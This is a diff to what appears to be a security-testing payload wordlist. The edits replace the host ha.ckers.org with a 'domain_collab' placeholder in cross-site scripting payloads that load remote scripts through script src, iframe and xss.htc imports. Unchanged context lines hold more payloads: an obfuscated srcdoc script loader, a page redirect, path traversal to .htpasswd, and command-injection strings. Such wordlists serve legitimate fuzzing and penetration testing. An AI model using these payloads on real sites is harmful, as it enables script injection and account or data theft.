@@ -6504,8 +6504,8 @@ hi' or 'x'='x';
 ././.htaccess
 .htaccess
 "><html><head></head><body><script>top.window.location = "https://domain_collab/hacked.html"</script></body></html>
-<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
-<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://domain_collab/xss.htc">
+<HTML xmlns:xss><?import namespace="xss" implementation="http://domain_collab/xss.htc"><xss:xss>XSS</xss:xss></HTML>
 ../.htpasswd
 .htpasswd
 /.htpasswd
@@ -6766,7 +6766,7 @@ id%00|
 ifconfig
 <!--[if<img src=x onerror=javascript:alert(1)//]> -->
 "><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;domain_collab&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
-<iframe src=http://ha.ckers.org/scriptlet.html <
+<iframe src=http://domain_collab/scriptlet.html <
 <!--[if]><script>javascript:alert(1)</script -->
 If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you.
 <img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
@@ -7886,9 +7886,9 @@ S
 <  script > < / script>
 < / script >< script >alert(123)< / script >
 </script><script>alert(123)</script>
-<SCRIPT SRC=//ha.ckers.org/.j>
-<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
-<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT SRC=//domain_collab/.j>
+<SCRIPT SRC=http://domain_collab/xss.js?< B >
+<SCRIPT/SRC="http://domain_collab/xss.js"></SCRIPT>
 "><script src=https://domain_collab></script>
 <script src="/\%(jscript)s"></script>
 <script src="\\%(jscript)s"></script>
@@ -7936,7 +7936,7 @@ S
 "`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
 "`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
 "`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/XSS SRC="http://domain_collab/xss.js"></SCRIPT>
 <sc<script>ript>alert(123)</sc</script>ript>
 Scunthorpe General Hospital
 select
